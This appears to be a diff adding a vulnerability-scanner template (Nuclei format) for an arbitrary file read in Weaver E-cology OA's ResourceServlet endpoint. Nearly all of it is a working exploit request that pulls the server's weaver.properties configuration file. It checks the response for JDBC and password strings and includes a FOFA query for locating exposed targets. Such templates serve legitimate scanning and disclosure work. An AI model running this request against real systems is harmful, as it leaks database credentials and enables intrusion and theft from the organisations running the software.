@@ -1,0 +1,30 @@
+id: weaver-ecology-resourceservlet-fileread
+
+info:
+  name: 泛微 OA E-Cology ResourceServlet - fileread
+  author: leadlife
+  severity: high
+  description: 泛微OA系统的 ResourceServlet 接口存在任意文件读取漏洞，允许攻击者读取任意文件。
+  metadata:
+    verified: false
+    fofa-query: app="泛微-OA（e-cology）"
+  tags: fileread,ecology,weaver,oa
+
+http:
+  - raw:
+      - |
+        GET /weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/prop/weaver.properties HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "DriverClasses"
+          - "jdbc"
+          - "password"
+        condition: and
